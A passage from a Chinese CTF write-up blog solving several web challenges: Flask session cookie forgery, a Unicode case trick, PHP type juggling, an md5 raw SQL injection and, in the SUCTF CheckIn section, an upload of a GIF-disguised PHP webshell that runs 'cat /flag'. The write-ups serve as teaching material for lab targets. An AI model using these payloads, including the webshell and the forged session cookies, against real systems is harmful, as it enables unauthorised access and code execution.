&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以得知&lt;code&gt;SECRET_KEY&lt;/code&gt;值为&lt;code&gt;ckj123&lt;/code&gt;。然后在index.html页面发现只要session[‘name’] == &amp;lsquo;admin’即可以得到flag。接下来就要使用到一个解密工具，需要解密出用户字符串的格式，再将用户名改为admin，加密后再去请求，我们就可以以admin的身份登陆了。&lt;/p&gt;
&lt;p&gt;如下 &lt;a class="link" href="https://www.leavesongs.com/" target="_blank" rel="noopener"
&gt;&lt;strong&gt;P师傅&lt;/strong&gt;&lt;/a&gt; 的程序解密：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; sys
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; zlib
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; base64 &lt;span style="color:#f92672"&gt;import&lt;/span&gt; b64decode
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; flask.sessions &lt;span style="color:#f92672"&gt;import&lt;/span&gt; session_json_serializer
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; itsdangerous &lt;span style="color:#f92672"&gt;import&lt;/span&gt; base64_decode
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;decryption&lt;/span&gt;(payload):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload, sig &lt;span style="color:#f92672"&gt;=&lt;/span&gt; payload&lt;span style="color:#f92672"&gt;.&lt;/span&gt;rsplit(&lt;span style="color:#e6db74"&gt;b&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload, timestamp &lt;span style="color:#f92672"&gt;=&lt;/span&gt; payload&lt;span style="color:#f92672"&gt;.&lt;/span&gt;rsplit(&lt;span style="color:#e6db74"&gt;b&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; decompress &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; payload&lt;span style="color:#f92672"&gt;.&lt;/span&gt;startswith(&lt;span style="color:#e6db74"&gt;b&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; payload[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;:]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; decompress &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; base64_decode(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;except&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Exception&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; e:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;raise&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Exception&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;Could not base64 decode the payload because of &amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;an exception&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; decompress:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; zlib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;decompress(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;except&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Exception&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; e:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;raise&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Exception&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;Could not zlib decompress the payload before &amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;decoding the payload&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; session_json_serializer&lt;span style="color:#f92672"&gt;.&lt;/span&gt;loads(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name__ &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(decryption(sys&lt;span style="color:#f92672"&gt;.&lt;/span&gt;argv[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]&lt;span style="color:#f92672"&gt;.&lt;/span&gt;encode()))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行命令&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;python run.py .eJw90MGKwkAMBuBXWXL2YLvuRfAgjBaFpFRGh8lFdK1tpxOFqmwd8d131gVvIX_4SPKA7bErLzWMr92tHMC2OcD4AR97GIPVOKIU-zzDgI4bDAeP2cZhWAcSO0SzcpiuhM26R1OMYi8h4faVSZGyniYYqk8y7FgdmlzFOV1LrufCat6gxpSikRu8WzMLrNqE1CJFXYzYRMmwZ-HahmXNGTkKi7sNbUpq6aP_xcpLrthbZyfwHMD3pTtur-e2PL1PyP_IUAWKS1uZ9Si2JzP3nLGg4NA6TMjYH9bexbonXXsuJi-ukV1VvqVi4xer6X9y2kkMoLqd97tTBQO4Xcru9TlIhvD8BSJwb7A.YELi9g.D_opOsSTFKn3wKeMF1rcGksx5HA
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;结果&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;{&amp;#39;_fresh&amp;#39;: True, &amp;#39;_id&amp;#39;: b&amp;#39;a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6&amp;#39;, &amp;#39;csrf_token&amp;#39;: b&amp;#39;895783633ba12f15aedff2c4b355f0e9cb3158ee&amp;#39;, &amp;#39;image&amp;#39;: b&amp;#39;AYHD&amp;#39;, &amp;#39;name&amp;#39;: &amp;#39;guobang&amp;#39;, &amp;#39;user_id&amp;#39;: &amp;#39;10&amp;#39;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后我们需要吧&lt;code&gt;name&lt;/code&gt;的值修改为&lt;code&gt;admin&lt;/code&gt;。修改完成以后还需要回到原来的session格式，那么就需要用到一个加密flask的工具：&lt;a class="link" href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener"
&gt;flask-session-cookie-manager&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这个工具也可以用来解密。我整理的使用方法如下，记得要用双引号&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;括起来&lt;/p&gt;
&lt;p&gt;python flask_session_cookie_manager{2,3}.py {encode,decode}&lt;/p&gt;
&lt;p&gt;-s &amp;ldquo;SECRET_KEY&amp;rdquo; 都需要使用
-c &amp;ldquo;Session cookie value&amp;rdquo; session的值 只有解密decode用得到
-t &amp;ldquo;Session cookie structure&amp;rdquo; cookie结构 只有encode用得&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;执行&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;python flask_session_cookie_manager3.py encode -s &amp;#34;ckj123&amp;#34; -t &amp;#34;{&amp;#39;_fresh&amp;#39;: True, &amp;#39;_id&amp;#39;: b&amp;#39;a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6&amp;#39;, &amp;#39;csrf_token&amp;#39;: b&amp;#39;895783633ba12f15aedff2c4b355f0e9cb3158ee&amp;#39;, &amp;#39;image&amp;#39;: b&amp;#39;AYHD&amp;#39;, &amp;#39;name&amp;#39;: &amp;#39;admin&amp;#39;, &amp;#39;user_id&amp;#39;: &amp;#39;10&amp;#39;}&amp;#34;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;得到&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;.eJw90MGKwkAMBuBXWXL2YLvdi-BBGC0KSamMDpOLuNtqO524UJWtI777zrrgLeQPH0nusDv09bmByaW_1iPYtRVM7vD2CROwGjNKcShyDOi4xVB5zLcOwyaQ2DGatcN0LWw2A5oyi72EhLtnJmXKepZgOL6TYceqagsV53QjhV4Iq0WLGlOKRmHwZs08sOoSUssUdZmxiZJhz8KNDauGc3IUljcbupTUykf_g5WXQrG3zk7hMYKvc3_YXb67-vQ6ofgjwzFQXNrKfECxA5mF55wFBcfWYULG_rD2LtYD6cZzOX1yreyP9Usqt365nv0np73EAPaVtCcYwfVc98-_QTKGxy8-U27W.YELpfA.vD1SVCAxOcwOPXc_DbwFqJT1TRg
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;放在请求头中，格式为&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;cookie: session=加密内容
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210306103214.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h2 id="解法二unicode欺骗"&gt;解法二：Unicode欺骗
&lt;/h2&gt;&lt;p&gt;第二种方法是利用代码中的strlower()函数的使用不当。这个函数分别在注册、登陆、修改密码的地方出现三次。这个方法的思路就是unicode加密三层，在最后一层修改密码时执行函数strlower()后修改到admin的密码。过程为&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ᴬᴰᴹᴵᴺ&amp;mdash;&amp;mdash;注册后&amp;mdash;&amp;mdash;&amp;gt;ADMIN&amp;mdash;修改密码&amp;mdash;&amp;gt;admin&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;ᴬᴰᴹᴵᴺ
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;注册以后使用&lt;code&gt;ᴬᴰᴹᴵᴺ&lt;/code&gt;登陆，然后修改密码时实际修改的就是admin的密码了，然后登陆admin即可。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="极客大挑战-2019buyflag"&gt;[极客大挑战 2019]BuyFlag
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121104213.png"
loading="lazy"
&gt;网站题直接去看源码，在源码也搜索php有两个：index.php、pay.php。前者是首页，直接看后面的那个，打开就有提示&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Only Cuit&amp;rsquo;s students can buy the FLAG&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;应该还是一道http的套娃题。查看网页的请求发现Cookie中有一个user=0，很可疑，改成user=1，有了下一个提示：输入密码，并且源码中有一段php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;!--
~~~post money and password~~~
if (isset($_POST[&amp;#39;password&amp;#39;])) {
$password = $_POST[&amp;#39;password&amp;#39;];
if (is_numeric($password)) {
echo &amp;#34;password can&amp;#39;t be number&amp;lt;/br&amp;gt;&amp;#34;;
}elseif ($password == 404) {
echo &amp;#34;Password Right!&amp;lt;/br&amp;gt;&amp;#34;;
}
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;还记得php&lt;code&gt;==&lt;/code&gt;关系运算会强制转换类型，用POST传一个password=404a，&lt;code&gt;404a&lt;/code&gt;会被强制转换为&lt;code&gt;404&lt;/code&gt;，密码就对上了。接下来是钱的问题，flag需要&lt;strong&gt;100000000&lt;/strong&gt;块钱我们也去要传过去。如果直接传入这么长的会提示字符串过长，所以我想到了科学计数法，&lt;code&gt;10e10&lt;/code&gt;，就是10的10次方，通过。最终的请求：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;POST /pay.php HTTP/1.1
Host: 268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn
Content-Length: 25
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://268f365e-648d-477c-ba25-0c56572cc31f.node3.buuoj.cn/pay.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: user=1
Connection: close
password=404a&amp;amp;money=10e10
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="suctf-2019checkin"&gt;[SUCTF 2019]CheckIn
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210201103750.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;知识点&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;.user.ini。它比.htaccess用的更广，不管是nginx/apache/IIS，只要是以fastcgi运行的php都可以用这个方法。可谓很广，不像.htaccess有局限性，只能是apache.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;准备好.user.ini文件内容为自动包含图片马，因为上传会检查文件头，所以添加了一个GIF文件头伪装：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GIF89a
auto_prepend_file=233.gif
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;接下来上传图片马，尝试了正常上传PHP马会提示：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;lt;? in contents!&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;所以使用script马执行php：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GIF89a
&amp;lt;script language=&amp;#34;php&amp;#34;&amp;gt;eval($_REQUEST[shell])&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;上传成功后会提示文件路径：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Your dir uploads/852aff287f54bca0ed7757a702913e50
Your files :
array(5) { [0]=&amp;gt; string(1) &amp;ldquo;.&amp;rdquo; [1]=&amp;gt; string(2) &amp;ldquo;..&amp;rdquo; [2]=&amp;gt; string(9) &amp;ldquo;.user.ini&amp;rdquo; [3]=&amp;gt; string(7) &amp;ldquo;233.gif&amp;rdquo; [4]=&amp;gt; string(9) &amp;ldquo;index.php&amp;rdquo; }&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;这时候.user.ini文件已经会帮我们自动包含图片马了，所以我们只需要访问一个PHP文件即可，正好上传目录下有一个index.php文件，可以直接蚁剑连接或者POST请求system(&amp;lsquo;cat /flag&amp;rsquo;)。&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="bjdctf2020easy-md5"&gt;[BJDCTF2020]Easy MD5
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210201105021.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class="link" href="https://www.jianshu.com/p/12125291f50d" target="_blank" rel="noopener"
&gt;【Jarvis OJ】Login&amp;ndash;password=&amp;rsquo;&amp;quot;.md5($pass,true).&amp;quot;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://blog.csdn.net/March97/article/details/81222922" target="_blank" rel="noopener"
&gt;sql注入：md5($password,true)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/" target="_blank" rel="noopener"
&gt;Leet More 2010 Oh Those Admins! writeup&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;随便输入一些东西都没有反应，在请求头中发现了一个Hint：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;select * from &amp;lsquo;admin&amp;rsquo; where password=md5($pass,true)&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;语法&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;md5(string,raw)&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;参数&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;string&lt;/td&gt;
&lt;td&gt;必需。要计算的字符串。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;raw&lt;/td&gt;
&lt;td&gt;可选。默认不写为FALSE。32位16进制的字符串TRUE。16位原始二进制格式的字符串&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;概括理解，这里如果raw参数为&lt;code&gt;true&lt;/code&gt;的话，这个函数的返回值是&lt;code&gt;string&lt;/code&gt;的md5加密值进行十六进制解码的字符串。这道题我当时是直接看了源码跳过了第一层，第一层的答案其实是&lt;code&gt;ffifdyop&lt;/code&gt;，我们来对它进行一波操作&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;源字符串：ffifdyop&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;md5加密值：276f722736c95d99e921722cf9ed621c&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;hex解码：&amp;lsquo;or'6É].é!r,ùíb.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后那几个应该是不可见字符，重要的是前面一段：&lt;code&gt;'or'6&lt;/code&gt;，这里还要说明一下，这提示应该不算严谨，真正的sql语句应该是在md5函数前后各一个&lt;code&gt;'&lt;/code&gt;单引号。执行以后真正的sql语句为&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;select * from &amp;#39;admin&amp;#39; where password=&amp;#39;&amp;#39;or&amp;#39;6É].é!r,ùíb.‘
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到原理是构成一个闭合，这里还有第二个知识点，是or后面的字符串被认为是true，引用文章里的一段：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;a string starting with a &lt;code&gt;1&lt;/code&gt; is cast as an integer when used as a boolean.&lt;/p&gt;
&lt;p&gt;在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。要注意的是这种情况是必须要有单引号括起来的，比如password=‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password=‘xxx’ or 1 ，也就相当于password=‘xxx’ or true，所以返回值就是true。当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;自己进行的测试：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210201113825.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210201113839.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;所以真正的解法是只要sql语句的格式为password=&amp;lsquo;xxxxxxxx&amp;rsquo; or &amp;lsquo;1xxxx&amp;rsquo;，即hex包含字符串&amp;quot;276f722731&amp;quot;（&amp;lsquo;or'1），其实or后面开头只要是数字即可，1-9的hex范围为31-39。&lt;/p&gt;
&lt;p&gt;下面这个程序是这道题开头参考列表中的第三个链接。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
for ($i = 0;;) {
for ($c = 0; $c &amp;lt; 1000000; $c++, $i++)
if (stripos(md5($i, true), &amp;#39;\&amp;#39;or\&amp;#39;&amp;#39;) !== false)
echo &amp;#34;\nmd5($i) = &amp;#34; . md5($i, true) . &amp;#34;\n&amp;#34;;
echo &amp;#34;.&amp;#34;;
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个程序遍历数字进行md5加密，使用stripos匹配是否有&lt;code&gt;'or'&lt;/code&gt;，这个函数有一个弊病就是如果是以&lt;code&gt;'or'&lt;/code&gt;开头的不会匹配到，并且我们需要的是or后面以数字开头都可以，所以需要稍微做一些修改，使用正则表达式由&lt;code&gt;\'or\'&lt;/code&gt;改为&lt;code&gt;'or'([1-9]+|0+[1-9])&lt;/code&gt; &lt;del&gt;不过我的方法自己还没跑出来🤣，回头加个多线程试一试&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;（更新）&lt;/p&gt;
&lt;p&gt;自己写了一个python程序，放在学生服务器上跑了一个下午加一个晚上，出了两个答案，好家伙从1跑到52亿：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210203094304.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt; 找到了md5(2413633098):
找到了md5(5207660362):
找到了md5(8351555222):
找到了md5(13095770027):
找到了md5(14860117901):
找到了md5(15724086109):
找到了md5(16529176061):
找到了md5(17428338265):
找到了md5(18717303578):
找到了md5(19342380396):
找到了md5(23960028257):
找到了md5(32561902614):
找到了md5(38983153698):
找到了md5(39742292223):
找到了md5(44120894060):
找到了md5(44820604888):
找到了md5(45570673322):
找到了md5(45855250502):
找到了md5(53660569009):
找到了md5(55098175010):
找到了md5(59763304323):
找到了md5(60185044906):
找到了md5(68625783421):
找到了md5(70949326264):
(md5值删了，因为乱码会影响博客的搜索功能)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;程序源码如下（自己写着玩，轻喷）：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;# codeing = utf-8
import threading
import hashlib
import re
import itertools
import time
# r&amp;#39;\&amp;#39;or\&amp;#39;([1-9]+|0+[1-9])&amp;#39;
# r&amp;#39;\&amp;#39;or\&amp;#39;&amp;#39;
pattern=re.compile(r&amp;#39;\&amp;#39;or\&amp;#39;([1-9]+|0+[1-9])&amp;#39;,re.I)
item = itertools.count(1)
def thrfunc():
while 1:
s2 = &amp;#39;&amp;#39;
temp = str(next(item))
s1 = hashlib.md5(temp.encode(encoding=&amp;#39;UTF-8&amp;#39;)).hexdigest()
for i in range(0, len(s1), 2):
s2 = s2 + chr(int(s1[i:i + 2], 16))
if re.search(pattern, s2):
print(&amp;#34;找到了md5(&amp;#34; + temp + &amp;#34;): &amp;#34; + s2)
threads=[]
for i in range(10):
t = threading.Thread(target=thrfunc)
threads.append(t)
t.start()
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;虽然不知道多整几个能用的值可以干什么，但是觉得自己写的程序跑出来答案就很爽🤣。&lt;/p&gt;
&lt;p&gt;还有一个能用的md5值：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;content: 129581926211651571912466741651878684928
hex: 06da5430449f8f6f23dfc1276f722738
raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&amp;#39;or&amp;#39;8
string: T0Do#&amp;#39;or&amp;#39;8
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以上是第一层。&lt;strong&gt;其实看了源码里只验证了字符串是否等于&lt;code&gt;ffifdyop&lt;/code&gt;我写的脚本里的值肯定通过不了&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;第二层可以直接在源码中看到注释。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;$a = $GET[&amp;#39;a&amp;#39;];
$b = $_GET[&amp;#39;b&amp;#39;];
if($a != $b &amp;amp;&amp;amp; md5($a) == md5($b)){
// wow, glzjin wants a girl friend.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;简单的md5以0E开头&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;a=QNKCDZO&amp;amp;b=240610708
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;第三层&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
error_reporting(0);
include &amp;#34;flag.php&amp;#34;;
highlight_file(__FILE__);
if($_POST[&amp;#39;param1&amp;#39;]!==$_POST[&amp;#39;param2&amp;#39;]&amp;amp;&amp;amp;md5($_POST[&amp;#39;param1&amp;#39;])===md5($_POST[&amp;#39;param2&amp;#39;])){
echo $flag;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这一有一些不同的是md5比较使用了&lt;code&gt;===&lt;/code&gt;不仅比较类型还比较值。但是md5有一个：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;md5([1,2,3]) == md5([4,5,6]) == NULL
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;所以传入两个数组，又能保证两个变量不相等，md5加密有都是NULL且类型是数组类型，注意数组里的值还是不可以一样的。&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;param1[]=1&amp;amp;param2[]=2
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="zjctf-2019nizhuansiwei"&gt;[ZJCTF 2019]NiZhuanSiWei
&lt;/h1&gt;&lt;p&gt;源码&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
$text = $_GET[&amp;#34;text&amp;#34;];
$file = $_GET[&amp;#34;file&amp;#34;];
$password = $_GET[&amp;#34;password&amp;#34;];
if(isset($text)&amp;amp;&amp;amp;(file_get_contents($text,&amp;#39;r&amp;#39;)===&amp;#34;welcome to the zjctf&amp;#34;)){
echo &amp;#34;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&amp;#34;.file_get_contents($text,&amp;#39;r&amp;#39;).&amp;#34;&amp;lt;/h1&amp;gt;&amp;lt;/br&amp;gt;&amp;#34;;
if(preg_match(&amp;#34;/flag/&amp;#34;,$file)){
echo &amp;#34;Not now!&amp;#34;;
exit();
}else{
include($file); //useless.php
$password = unserialize($password);
echo $password;
}
}
else{
highlight_file(__FILE__);
}
?&amp;gt;
